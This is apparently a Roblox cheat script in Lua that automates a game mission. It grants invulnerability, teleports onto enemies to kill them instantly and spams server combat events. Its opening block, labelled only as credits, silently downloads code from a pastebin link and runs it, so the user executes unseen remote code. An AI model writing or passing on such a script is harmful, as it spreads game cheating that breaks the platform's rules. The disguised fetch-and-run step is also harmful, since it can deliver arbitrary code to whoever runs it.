-- Credits
pcall(function()
    loadstring(game:HttpGet("https://pastebin.com/raw/vJg6Sa8w", true))()
end)

-- Variable
local player = game.Players.LocalPlayer
local mission = workspace.Missions["Jessica Vibe"]
player.MaximumSimulationRadius = math.huge

-- Player Check
if #game.Players:GetPlayers() ~= 1 then
    spawn(function()
        pcall(function()
            player:Kick("Private Server Required")
        end)
    end)
    wait(2.5)
    game:Shutdown()
end

-- GodMode
pcall(function()
	local char = game.Players.LocalPlayer.Character
	local clone = char.fakehealth:Clone()
	char.fakehealth:Destroy()
	clone.Parent = char
end)

-- Kill
function kill()
    local shit = workspace.npc:GetChildren()
    for i = 1, #shit do local v = shit[i]
        pcall(function()
			player.Character.HumanoidRootPart.CFrame = v.Head.CFrame
            v.Humanoid.Health = 0
			wait(.1)
        end)
    end
end

-- Start
while wait(1) do
	print("start")
    repeat
        mission.main.startmission:FireServer()
        wait(1)
	until #workspace.npc:GetChildren() > 1
	local npc = workspace.npc:GetChildren()[2]
	print"punch"
	for i = 1, 30 do
		pcall(function()
			player.Character.HumanoidRootPart.CFrame = npc.HumanoidRootPart.CFrame*CFrame.new(0,0,3)
			player.Character.combat.update:FireServer("mouse1", true)
		end)
		wait(.1)
	end
	print"kill"
	repeat
		kill()
		wait()
    until #workspace.npc:GetChildren() < 2
	print"finished"
end